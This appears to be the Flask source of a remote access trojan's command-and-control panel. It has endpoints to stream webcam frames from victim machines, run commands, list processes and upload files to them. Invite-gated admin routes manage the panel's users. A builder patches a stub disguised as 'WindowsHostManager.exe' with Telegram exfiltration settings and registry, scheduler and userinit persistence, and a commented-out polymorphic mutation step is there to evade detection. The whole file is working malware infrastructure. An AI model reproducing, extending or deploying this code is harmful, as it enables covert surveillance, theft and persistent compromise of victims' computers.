# ===== REMOTE CAMERA FRAME ENDPOINT =====

@app.route('/api/c2/camera_frame/<client_id>')
@login_required
def c2_get_camera_frame(client_id):
    user = request.current_user
    with camera_frames_lock:
        frame = camera_frames.get(client_id)
    if not frame:
        return '', 204

    try:
        last_ts = float(request.args.get('ts', 0))
    except (ValueError, TypeError):
        last_ts = 0

    if frame['ts'] <= last_ts:
        return '', 304

    return jsonify({
        'ts': frame['ts'],
        'b64': base64.b64encode(frame['data']).decode('ascii')
    })


@app.route('/api/c2/camera_devices/<client_id>')
@login_required
def c2_get_camera_devices(client_id):
    user = request.current_user
    with camera_devices_lock:
        devices = camera_devices.get(client_id)
    if devices is None:
        with ws_clients_lock:
            wsc = ws_clients.get(client_id)
        if wsc:
            wsc['cmd_queue'].put(json.dumps({'type': 'command', 'command': 'camera_list'}, separators=(',', ':')))
        return jsonify(None)  # null = still waiting, client should retry
    return jsonify(devices)  # [] = no cameras found, [...] = has devices
@app.route('/api/c2/terminal_result/<client_id>')
@login_required
def c2_get_terminal_result(client_id):
    with terminal_results_lock:
        res = terminal_results.pop(client_id, None)
    return jsonify({'output': res})


@app.route('/api/c2/tasklist/<client_id>')
@login_required
def c2_get_tasklist(client_id):
    with tasklist_results_lock:
        tasks = tasklist_results.pop(client_id, None)
    return jsonify({'tasks': tasks})


@app.route('/api/c2/fm/result/<client_id>')
@login_required
def c2_fm_result(client_id):
    with fm_results_lock:
        res = fm_results.pop(client_id, None)
    return jsonify(res)


@app.route('/api/c2/fm/upload/<client_id>', methods=['POST'])
@login_required
def c2_fm_upload(client_id):
    user = request.current_user
    with get_db() as db:
        client = db.execute('SELECT client_id FROM clients WHERE client_id = ? AND user_id = ?',
                            (client_id, user['id'])).fetchone()
        if not client:
            return jsonify({'error': 'client not found'}), 404
    with ws_clients_lock:
        wsc = ws_clients.get(client_id)
    if not wsc:
        return jsonify({'error': 'client offline'}), 404

    dest_path = request.form.get('path', '')
    file = request.files.get('file')
    if not dest_path or not file:
        return jsonify({'error': 'missing path or file'}), 400

    data_b64 = base64.b64encode(file.read()).decode('ascii')
    command = f'fm_upload:{dest_path}|{data_b64}'
    wsc['cmd_queue'].put(json.dumps({'type': 'command', 'command': command}, separators=(',', ':')))
    return jsonify({'success': True})


# ===== ADMIN API ENDPOINTS =====

@app.route('/api/admin/users')
@admin_required
def admin_get_users():
    try:
        with get_db() as db:
            rows = db.execute('''
                SELECT u.id, u.username, u.role, u.api_key, u.is_banned, u.ban_reason, u.created_at,
                       COUNT(l.id) as log_count
                FROM users u
                LEFT JOIN logs l ON u.id = l.user_id
                GROUP BY u.id
                ORDER BY u.id ASC
            ''').fetchall()
        users = [dict(r) for r in rows]
        return jsonify({'users': users})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/admin/users/<int:user_id>/ban', methods=['POST'])
@admin_required
def admin_ban_user(user_id):
    try:
        data = request.json or {}
        is_banned = 1 if data.get('is_banned') else 0
        ban_reason = (data.get('ban_reason') or '').strip()

        with get_db() as db:
            user = db.execute('SELECT username, role FROM users WHERE id = ?', (user_id,)).fetchone()
            if not user:
                return jsonify({'error': 'User not found'}), 404
            if user['role'] == 'admin' and is_banned:
                return jsonify({'error': 'Cannot ban an admin user'}), 400

            db.execute('UPDATE users SET is_banned = ?, ban_reason = ? WHERE id = ?', (is_banned, ban_reason, user_id))
            db.commit()

        action = 'BAN_USER' if is_banned else 'UNBAN_USER'
        details = f"{'Banned' if is_banned else 'Unbanned'} user '{user['username']}' (ID #{user_id}). Reason: {ban_reason or 'None'}"
        log_audit(action, details)

        return jsonify({'success': True, 'is_banned': is_banned, 'ban_reason': ban_reason})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/admin/users/<int:user_id>/logs')
@admin_required
def admin_get_user_logs(user_id):
    try:
        with get_db() as db:
            user = db.execute('SELECT username FROM users WHERE id = ?', (user_id,)).fetchone()
            if not user:
                return jsonify({'error': 'User not found'}), 404
            logs_rows = db.execute('SELECT * FROM logs WHERE user_id = ? ORDER BY id DESC', (user_id,)).fetchall()
        logs = [dict(r) for r in logs_rows]
        return jsonify({'user': dict(user), 'logs': logs})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/admin/audit_logs')
@admin_required
def admin_get_audit_logs():
    try:
        page = int(request.args.get('page', 1))
        limit = int(request.args.get('limit', 50))
        offset = (page - 1) * limit
        with get_db() as db:
            rows = db.execute('SELECT * FROM audit_logs ORDER BY id DESC LIMIT ? OFFSET ?', (limit, offset)).fetchall()
            total = db.execute('SELECT COUNT(*) FROM audit_logs').fetchone()[0]
        audit_logs = [dict(r) for r in rows]
        return jsonify({'audit_logs': audit_logs, 'total': total})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/admin/invites/generate', methods=['POST'])
@admin_required
def admin_generate_invite():
    try:
        code = f"AST-{secrets.token_hex(6).upper()}"
        user = request.current_user
        with get_db() as db:
            db.execute('INSERT INTO invites (code, created_by) VALUES (?, ?)', (code, user['id']))
            db.commit()
        log_audit('INVITE_CREATE', f"Generated invite code: {code}")
        return jsonify({'success': True, 'code': code})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/admin/invites', methods=['GET', 'POST'])
@admin_required
def admin_invites_handler():
    try:
        user = request.current_user
        if request.method == 'POST':
            code = f"AST-{secrets.token_hex(6).upper()}"
            with get_db() as db:
                db.execute('INSERT INTO invites (code, created_by) VALUES (?, ?)', (code, user['id']))
                db.commit()
            log_audit('INVITE_CREATE', f"Generated invite code: {code}")
            return jsonify({'success': True, 'code': code})

        with get_db() as db:
            rows = db.execute('''
                SELECT i.*, u1.username as creator_name, u2.username as user_name
                FROM invites i
                LEFT JOIN users u1 ON i.created_by = u1.id
                LEFT JOIN users u2 ON i.used_by = u2.id
                ORDER BY i.created_at DESC
            ''').fetchall()
        invites = [dict(r) for r in rows]
        return jsonify({'invites': invites})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/admin/invites/<code>', methods=['DELETE'])
@admin_required
def admin_delete_invite(code):
    try:
        with get_db() as db:
            db.execute('DELETE FROM invites WHERE code = ? AND used_by IS NULL', (code,))
            db.commit()
        log_audit('INVITE_DELETE', f"Revoked invite code: {code}")
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


# ===== BUILDER =====

@app.route('/api/build', methods=['POST'])
@login_required
def build_client():
    try:
        data = request.json
        delivery = data.get('delivery', 'TELEGRAM')
        bot_token = data.get('botToken', '')
        chat_id = data.get('chatId', '')
        panel_url = data.get('panelUrl', '')
        secret_key = data.get('secretKey', '')
        persistence = data.get('persistence', 'registry,scheduler,userinit')

        stub_dir = os.path.join(BASE_DIR, 'stub')
        root_dir = os.path.dirname(BASE_DIR)
        stub_search_paths = [
            os.path.join(stub_dir, 'WindowsHostManager.exe'),
            os.path.join(root_dir, 'Main', 'bin', 'Release', 'net462', 'WindowsHostManager.exe'),
            os.path.join(root_dir, 'Main', 'bin', 'Debug', 'net462', 'WindowsHostManager.exe'),
        ]
        config_search_paths = [
            os.path.join(stub_dir, 'config.json'),
            os.path.join(root_dir, 'Main', 'config.json'),
        ]
        source_dir = os.path.join(root_dir, 'Main')

        stub_path = next((p for p in stub_search_paths if os.path.exists(p)), None)
        config_path = next((p for p in config_search_paths if os.path.exists(p)), None)

        if not stub_path or not config_path:
            return jsonify({'error': 'Stub base templates not found. Run "dotnet build" on the C# solution first!'}), 404

        with open(config_path, 'r', encoding='utf-8') as f:
            old_config = f.read()
        with open(stub_path, 'rb') as f:
            stub_bytes = bytearray(f.read())

        def get_placeholder(config, key):
            search = f'"{key}":"'
            start = config.find(search)
            if start == -1: return ""
            start += len(search)
            end = config.find('"', start)
            return config[start:end]

        def pad_value(val, length):
            if len(val) > length: return val[:length]
            return val.ljust(length, ' ')

        delivery_placeholder = get_placeholder(old_config, 'delivery')
        token_placeholder = get_placeholder(old_config, 'botToken')
        chat_placeholder = get_placeholder(old_config, 'chatId')
        panel_url_placeholder = get_placeholder(old_config, 'panelUrl')
        secret_key_placeholder = get_placeholder(old_config, 'secretKey')
        persist_placeholder = get_placeholder(old_config, 'persistence')

        new_config = (
            old_config
            .replace(delivery_placeholder, pad_value(delivery, len(delivery_placeholder)))
            .replace(token_placeholder, pad_value(bot_token, len(token_placeholder)))
            .replace(chat_placeholder, pad_value(chat_id, len(chat_placeholder)))
            .replace(panel_url_placeholder, pad_value(panel_url, len(panel_url_placeholder)))
            .replace(secret_key_placeholder, pad_value(secret_key, len(secret_key_placeholder)))
            .replace(persist_placeholder, pad_value(persistence, len(persist_placeholder)))
        )

        old_config_bytes = old_config.encode('utf-8')
        new_config_bytes = new_config.encode('utf-8')

        if len(old_config_bytes) != len(new_config_bytes):
            return jsonify({'error': 'Configuration padding mismatch'}), 400

        replaced = False
        search_len = len(old_config_bytes)
        for i in range(len(stub_bytes) - search_len + 1):
            if stub_bytes[i:i+search_len] == old_config_bytes:
                stub_bytes[i:i+search_len] = new_config_bytes
                replaced = True
                break

        if not replaced:
            return jsonify({'error': 'Stub binary configuration signature not found'}), 400

        # from polymorph import mutate
        # stub_bytes = mutate(stub_bytes, source_dir=source_dir)

        builds_dir = os.path.join(BASE_DIR, 'public', 'builds')
        os.makedirs(builds_dir, exist_ok=True)
        output_filename = f"build_{datetime.now().strftime('%Y%m%d_%H%M%S')}.exe"
        output_path = os.path.join(builds_dir, output_filename)

        with open(output_path, 'wb') as f:
            f.write(stub_bytes)

        return jsonify({'success': True, 'downloadUrl': f"/api/build/download/{output_filename}"})
    except Exception as e:
        print(f"[BUILDER] Compile Error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/build/download/<filename>')
@login_required
def download_build(filename):
    builds_dir = os.path.join(BASE_DIR, 'public', 'builds')
    path = os.path.join(builds_dir, filename)
    if os.path.exists(path):
        return send_file(path, as_attachment=True, download_name='WindowsHostManager.exe')
    return 'Build file not found', 404

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
